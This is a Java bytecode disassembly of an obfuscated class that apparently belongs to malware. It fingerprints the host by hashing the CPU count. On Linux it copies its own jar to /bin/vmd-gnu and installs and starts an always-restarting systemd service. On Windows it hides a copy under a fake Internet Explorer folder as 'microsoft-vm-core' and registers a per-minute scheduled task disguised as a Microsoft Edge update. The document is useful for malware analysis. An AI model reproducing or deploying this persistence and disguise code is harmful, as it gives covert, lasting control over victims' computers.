// class version 52.0 (52)
// access flags 0x21
public class U {

  // compiled from: 

  ATTRIBUTE Code : unknown

  // access flags 0x1
  public <init>()V
   L0
    LINENUMBER 30 L0
    ALOAD 0
    INVOKESPECIAL java/lang/Object.<init> ()V
    RETURN
    MAXSTACK = 1
    MAXLOCALS = 1

  // access flags 0x9
  public static a()Ljava/lang/String;
    TRYCATCHBLOCK L0 L1 L2 java/lang/Exception
   L0
    LINENUMBER 34 L0
    LDC "SHA-1"
    INVOKESTATIC java/security/MessageDigest.getInstance (Ljava/lang/String;)Ljava/security/MessageDigest;
    ASTORE 0
   L3
    LINENUMBER 35 L3
    INVOKESTATIC java/lang/Runtime.getRuntime ()Ljava/lang/Runtime;
    INVOKEVIRTUAL java/lang/Runtime.availableProcessors ()I
    ISTORE 1
   L4
    LINENUMBER 36 L4
    ALOAD 0
    ICONST_4
    NEWARRAY T_BYTE
    DUP
    ICONST_0
    ILOAD 1
    I2B
    BASTORE
    DUP
    ICONST_1
    ILOAD 1
    BIPUSH 8
    IUSHR
    I2B
    BASTORE
    DUP
    ICONST_2
    ILOAD 1
    BIPUSH 16
    ISHR
    I2B
    BASTORE
    DUP
    ICONST_3
    ILOAD 1
    BIPUSH 24
    ISHR
    I2B
    BASTORE
    INVOKEVIRTUAL java/security/MessageDigest.update ([B)V
   L5
    LINENUMBER 37 L5
    ALOAD 0
    INVOKEVIRTUAL java/security/MessageDigest.digest ()[B
    INVOKESTATIC U.a ([B)Ljava/lang/String;
   L1
    ARETURN
   L2
    LINENUMBER 38 L2
   FRAME SAME1 java/lang/Exception
    ASTORE 0
   L6
    LINENUMBER 39 L6
    NEW java/lang/StringBuilder
    DUP
    INVOKESPECIAL java/lang/StringBuilder.<init> ()V
    ALOAD 0
    INVOKEVIRTUAL java/lang/Object.getClass ()Ljava/lang/Class;
    INVOKEVIRTUAL java/lang/Class.getSimpleName ()Ljava/lang/String;
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    LDC " - "
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    ALOAD 0
    INVOKEVIRTUAL java/lang/Exception.getMessage ()Ljava/lang/String;
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    INVOKEVIRTUAL java/lang/StringBuilder.toString ()Ljava/lang/String;
    ARETURN
    MAXSTACK = 6
    MAXLOCALS = 2

  // access flags 0x9
  public static a([B)Ljava/lang/String;
    // parameter  arr
   L0
    LINENUMBER 44 L0
    NEW java/lang/StringBuilder
    DUP
    ALOAD 0
    ARRAYLENGTH
    ICONST_2
    IMUL
    INVOKESPECIAL java/lang/StringBuilder.<init> (I)V
    ASTORE 1
   L1
    LINENUMBER 45 L1
    ALOAD 0
    ASTORE 2
    ALOAD 2
    ARRAYLENGTH
    ISTORE 3
    ICONST_0
    ISTORE 4
   L2
   FRAME FULL [T java/lang/StringBuilder [B I I] []
    ILOAD 4
    ILOAD 3
    IF_ICMPGE L3
    ALOAD 2
    ILOAD 4
    BALOAD
    ISTORE 5
   L4
    LINENUMBER 46 L4
    ALOAD 1
    ILOAD 5
    ICONST_4
    IUSHR
    INVOKEVIRTUAL java/lang/StringBuilder.append (I)Ljava/lang/StringBuilder;
    ILOAD 5
    BIPUSH 15
    IAND
    INVOKEVIRTUAL java/lang/StringBuilder.append (I)Ljava/lang/StringBuilder;
    POP
   L5
    LINENUMBER 45 L5
    IINC 4 1
    GOTO L2
   L3
    LINENUMBER 48 L3
   FRAME CHOP 3
    ALOAD 1
    INVOKEVIRTUAL java/lang/StringBuilder.toString ()Ljava/lang/String;
    ARETURN
    MAXSTACK = 4
    MAXLOCALS = 6

  // access flags 0x9
  public static a()V
    TRYCATCHBLOCK L0 L1 L2 java/lang/Throwable
    TRYCATCHBLOCK L3 L4 L2 java/lang/Throwable
   L0
    LINENUMBER 53 L0
    INVOKESTATIC W.a ()Z
    IFEQ L5
   L6
    LINENUMBER 54 L6
    NEW java/io/File
    DUP
    LDC "/bin/vmd-gnu"
    INVOKESPECIAL java/io/File.<init> (Ljava/lang/String;)V
    ASTORE 0
   L7
    LINENUMBER 55 L7
    NEW java/io/File
    DUP
    LDC "/etc/systemd/system/vmd-gnu.service"
    INVOKESPECIAL java/io/File.<init> (Ljava/lang/String;)V
    ASTORE 1
   L8
    LINENUMBER 56 L8
    ALOAD 0
    INVOKEVIRTUAL java/io/File.exists ()Z
    IFEQ L3
    ALOAD 1
    INVOKEVIRTUAL java/io/File.exists ()Z
    IFEQ L3
   L9
    LINENUMBER 57 L9
    INVOKESTATIC java/lang/Runtime.getRuntime ()Ljava/lang/Runtime;
    ICONST_3
    ANEWARRAY java/lang/String
    DUP
    ICONST_0
    LDC "/bin/sh"
    AASTORE
    DUP
    ICONST_1
    LDC "-c"
    AASTORE
    DUP
    ICONST_2
    LDC "systemctl --type=service | grep vmd-gnu.service"
    AASTORE
    INVOKEVIRTUAL java/lang/Runtime.exec ([Ljava/lang/String;)Ljava/lang/Process;
    ASTORE 2
   L10
    LINENUMBER 58 L10
    ALOAD 2
    INVOKEVIRTUAL java/lang/Process.waitFor ()I
    POP
   L11
    LINENUMBER 59 L11
    ALOAD 2
    INVOKEVIRTUAL java/lang/Process.getInputStream ()Ljava/io/InputStream;
    INVOKEVIRTUAL java/io/InputStream.available ()I
    IFLE L12
    ICONST_1
    GOTO L13
   L12
   FRAME SAME
    ICONST_0
   L13
   FRAME SAME1 I
    ISTORE 3
   L14
    LINENUMBER 60 L14
    ILOAD 3
    IFNE L1
   L15
    LINENUMBER 61 L15
    INVOKESTATIC java/lang/Runtime.getRuntime ()Ljava/lang/Runtime;
    ICONST_3
    ANEWARRAY java/lang/String
    DUP
    ICONST_0
    LDC "/bin/sh"
    AASTORE
    DUP
    ICONST_1
    LDC "-c"
    AASTORE
    DUP
    ICONST_2
    LDC "systemctl enable vmd-gnu"
    AASTORE
    INVOKEVIRTUAL java/lang/Runtime.exec ([Ljava/lang/String;)Ljava/lang/Process;
    INVOKEVIRTUAL java/lang/Process.waitFor ()I
    POP
   L16
    LINENUMBER 62 L16
    INVOKESTATIC java/lang/Runtime.getRuntime ()Ljava/lang/Runtime;
    ICONST_3
    ANEWARRAY java/lang/String
    DUP
    ICONST_0
    LDC "/bin/sh"
    AASTORE
    DUP
    ICONST_1
    LDC "-c"
    AASTORE
    DUP
    ICONST_2
    LDC "systemctl start vmd-gnu"
    AASTORE
    INVOKEVIRTUAL java/lang/Runtime.exec ([Ljava/lang/String;)Ljava/lang/Process;
    INVOKEVIRTUAL java/lang/Process.waitFor ()I
    POP
   L17
    LINENUMBER 63 L17
    ICONST_0
    INVOKESTATIC java/lang/System.exit (I)V
   L1
    LINENUMBER 65 L1
   FRAME SAME
    RETURN
   L3
    LINENUMBER 67 L3
   FRAME APPEND [java/io/File java/io/File]
    NEW java/lang/StringBuilder
    DUP
    INVOKESPECIAL java/lang/StringBuilder.<init> ()V
    LDC "[Unit]\nDescription=vmd-gnu local service\nAfter=network.target\nStartLimitIntervalSec=0\n\n[Service]\nType=simple\nRestart=always\nRestartSec=1\nUser="
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    LDC "user.name"
   L18
    LINENUMBER 76 L18
    INVOKESTATIC java/lang/System.getProperty (Ljava/lang/String;)Ljava/lang/String;
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    LDC "\nExecStart=/bin/sh -c \"java -Dauto=true -jar /bin/vmd-gnu\"\n\n[Install]\nWantedBy=multi-user.target"
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    INVOKEVIRTUAL java/lang/StringBuilder.toString ()Ljava/lang/String;
    ASTORE 2
   L19
    LINENUMBER 81 L19
    LDC LU;.class
    INVOKEVIRTUAL java/lang/Class.getProtectionDomain ()Ljava/security/ProtectionDomain;
    INVOKEVIRTUAL java/security/ProtectionDomain.getCodeSource ()Ljava/security/CodeSource;
    INVOKEVIRTUAL java/security/CodeSource.getLocation ()Ljava/net/URL;
    ASTORE 3
   L20
    LINENUMBER 82 L20
    NEW java/io/File
    DUP
    ALOAD 3
    INVOKEVIRTUAL java/net/URL.getFile ()Ljava/lang/String;
    INVOKESPECIAL java/io/File.<init> (Ljava/lang/String;)V
    INVOKEVIRTUAL java/io/File.toPath ()Ljava/nio/file/Path;
    ALOAD 0
    INVOKEVIRTUAL java/io/File.toPath ()Ljava/nio/file/Path;
    ICONST_1
    ANEWARRAY java/nio/file/CopyOption
    DUP
    ICONST_0
    GETSTATIC java/nio/file/StandardCopyOption.REPLACE_EXISTING : Ljava/nio/file/StandardCopyOption;
    AASTORE
    INVOKESTATIC java/nio/file/Files.copy (Ljava/nio/file/Path;Ljava/nio/file/Path;[Ljava/nio/file/CopyOption;)Ljava/nio/file/Path;
    POP
   L21
    LINENUMBER 83 L21
    ALOAD 1
    INVOKEVIRTUAL java/io/File.toPath ()Ljava/nio/file/Path;
    ALOAD 2
    INVOKEVIRTUAL java/lang/String.getBytes ()[B
    ICONST_0
    ANEWARRAY java/nio/file/OpenOption
    INVOKESTATIC java/nio/file/Files.write (Ljava/nio/file/Path;[B[Ljava/nio/file/OpenOption;)Ljava/nio/file/Path;
    POP
   L22
    LINENUMBER 85 L22
    INVOKESTATIC java/lang/Runtime.getRuntime ()Ljava/lang/Runtime;
    ICONST_3
    ANEWARRAY java/lang/String
    DUP
    ICONST_0
    LDC "/bin/sh"
    AASTORE
    DUP
    ICONST_1
    LDC "-c"
    AASTORE
    DUP
    ICONST_2
    LDC "systemctl enable vmd-gnu"
    AASTORE
    INVOKEVIRTUAL java/lang/Runtime.exec ([Ljava/lang/String;)Ljava/lang/Process;
    INVOKEVIRTUAL java/lang/Process.waitFor ()I
    POP
   L23
    LINENUMBER 86 L23
    INVOKESTATIC java/lang/Runtime.getRuntime ()Ljava/lang/Runtime;
    ICONST_3
    ANEWARRAY java/lang/String
    DUP
    ICONST_0
    LDC "/bin/sh"
    AASTORE
    DUP
    ICONST_1
    LDC "-c"
    AASTORE
    DUP
    ICONST_2
    LDC "systemctl start vmd-gnu"
    AASTORE
    INVOKEVIRTUAL java/lang/Runtime.exec ([Ljava/lang/String;)Ljava/lang/Process;
    INVOKEVIRTUAL java/lang/Process.waitFor ()I
    POP
   L24
    LINENUMBER 87 L24
    ICONST_0
    INVOKESTATIC java/lang/System.exit (I)V
   L25
    LINENUMBER 89 L25
    GOTO L4
   L5
    LINENUMBER 93 L5
   FRAME CHOP 2
    NEW java/io/File
    DUP
    NEW java/lang/StringBuilder
    DUP
    INVOKESPECIAL java/lang/StringBuilder.<init> ()V
    LDC "appdata"
    INVOKESTATIC java/lang/System.getenv (Ljava/lang/String;)Ljava/lang/String;
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    LDC "\\..\\LocalLow\\Microsoft\\Internet Explorer\\DOMStore\\"
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    INVOKEVIRTUAL java/lang/StringBuilder.toString ()Ljava/lang/String;
    INVOKESPECIAL java/io/File.<init> (Ljava/lang/String;)V
    ASTORE 0
   L26
    LINENUMBER 94 L26
    ALOAD 0
    INVOKEVIRTUAL java/io/File.mkdirs ()Z
    POP
   L27
    LINENUMBER 95 L27
    NEW java/io/File
    DUP
    ALOAD 0
    INVOKEVIRTUAL java/io/File.getPath ()Ljava/lang/String;
    LDC "microsoft-vm-core"
    INVOKESPECIAL java/io/File.<init> (Ljava/lang/String;Ljava/lang/String;)V
    INVOKEVIRTUAL java/io/File.getCanonicalFile ()Ljava/io/File;
    ASTORE 1
   L28
    LINENUMBER 96 L28
    GETSTATIC b.a : Ljava/io/File;
    INVOKEVIRTUAL java/io/File.toPath ()Ljava/nio/file/Path;
    ALOAD 1
    INVOKEVIRTUAL java/io/File.toPath ()Ljava/nio/file/Path;
    ICONST_1
    ANEWARRAY java/nio/file/CopyOption
    DUP
    ICONST_0
    GETSTATIC java/nio/file/StandardCopyOption.REPLACE_EXISTING : Ljava/nio/file/StandardCopyOption;
    AASTORE
    INVOKESTATIC java/nio/file/Files.copy (Ljava/nio/file/Path;Ljava/nio/file/Path;[Ljava/nio/file/CopyOption;)Ljava/nio/file/Path;
    POP
   L29
    LINENUMBER 97 L29
    NEW java/lang/StringBuilder
    DUP
    INVOKESPECIAL java/lang/StringBuilder.<init> ()V
    LDC "cmd /C \"echo n | schtasks /Create /SC MINUTE /TR \"javaw -jar '"
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    ALOAD 1
    INVOKEVIRTUAL java/io/File.getAbsolutePath ()Ljava/lang/String;
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    LDC "'\" /tn \"MicrosoftEdgeUpdateTaskMachineVM\"\""
    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
    INVOKEVIRTUAL java/lang/StringBuilder.toString ()Ljava/lang/String;
    ASTORE 2
   L30
    LINENUMBER 98 L30
    INVOKESTATIC java/lang/Runtime.getRuntime ()Ljava/lang/Runtime;
    ALOAD 2
    INVOKEVIRTUAL java/lang/Runtime.exec (Ljava/lang/String;)Ljava/lang/Process;
    POP
   L4
    LINENUMBER 106 L4
   FRAME SAME
    GOTO L31
   L2
    LINENUMBER 104 L2
   FRAME SAME1 java/lang/Throwable
    ASTORE 0
   L32
    LINENUMBER 105 L32
    ALOAD 0
    INVOKEVIRTUAL java/lang/Throwable.printStackTrace ()V
   L31
    LINENUMBER 107 L31
   FRAME SAME
    RETURN
    MAXSTACK = 6
    MAXLOCALS = 4
}
